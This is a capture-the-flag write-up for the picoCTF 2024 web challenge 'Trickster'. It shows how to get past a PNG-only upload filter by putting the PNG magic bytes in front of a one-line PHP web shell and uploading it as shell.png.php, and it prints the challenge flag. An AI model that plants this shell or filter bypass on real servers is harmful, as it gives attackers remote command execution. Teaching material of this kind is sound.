# Trickster
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
## Challenge information
```text
Tags: Web Explotation, picoCTF 2024, browser_webshell_solvable

Description: 
I found a web app that can help process images: PNG images only!

Hints: None
```
## Overview
### When accessing the web, we can see a page that allows us to upload png files
![alt text](/picoCTF/Static/Images/Trickster/image1.png)  
* I tried uploading an image file, and this is what I got 

![alt text](/picoCTF/Static/Images/Trickster/image2.png)
## Solution
**Step1:** Recon  
* Usually when I encounter a website like this, I immediately think of the existence of a file upload vulnerability  
* Those websites do not return the path to the uploaded file for us, now let's try to find more data  
* I tried accessing /robots.txt and this is the result I got

![alt text](/picoCTF/Static/Images/Trickster/image3.png)  
* We can use /uploads/x.png to view images  
* i also tried accessing /instructions.txt to see what was there and this is what i got  
```text
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
* It gives us some information that the web will check the .png extension and will check the first few hex bits of the file to see if it is PNG or not.  
* The administrator will store the files and take the necessary steps to read the files => this is indeed a file upload vulnerability  
**Step2:** Exploit  
* We need to think of ways to bypass web authentication  
* First we will create a shell.php file containing malicious code   
```PHP
<?php echo system($_GET["cmd"]) ?>
```
* Then we can add the PNG at the beginning, so if the web checks the first few hex bits it won't be revealed.  
```PHP
PNG<?php echo system($_GET["cmd"]) ?>
```
* Now turn on burpsuite and catch requests  
* Rename the file to shell.png.php and then upload it  
* We have successfully defrauded the website, now let's use OS commands to get the flag  
## Flag
`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}`
